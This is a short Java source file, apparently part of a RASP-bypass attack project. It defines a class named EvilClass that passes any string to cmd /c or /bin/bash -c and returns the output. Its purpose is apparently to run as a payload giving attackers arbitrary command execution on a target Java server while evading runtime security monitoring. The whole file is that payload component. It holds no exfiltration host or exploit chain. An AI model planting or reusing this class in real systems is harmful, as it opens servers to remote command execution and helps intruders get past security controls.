package com.example.raspbypass.Util;

import java.io.InputStream;
import java.util.Scanner;

public class EvilClass {
    public String exec(String cmd) throws Exception {
        String[] command;
        if (isWin()) {
            command = new String[]{"cmd", "/c", cmd};
        } else {
            command = new String[]{"/bin/bash", "-c", cmd};
        }
        if (cmd != null) {
            InputStream in = null;
            in = Runtime.getRuntime().exec(command).getInputStream();
            Scanner scanner = new Scanner(in).useDelimiter("\\A");
            String out = scanner.hasNext() ? scanner.next() : "";
            return out;
        } else {
            return "Null";
        }
    }
    public static boolean isWin(){
        return System.getProperty("os.name") != null && System.getProperty("os.name").startsWith("Win");
    }
}
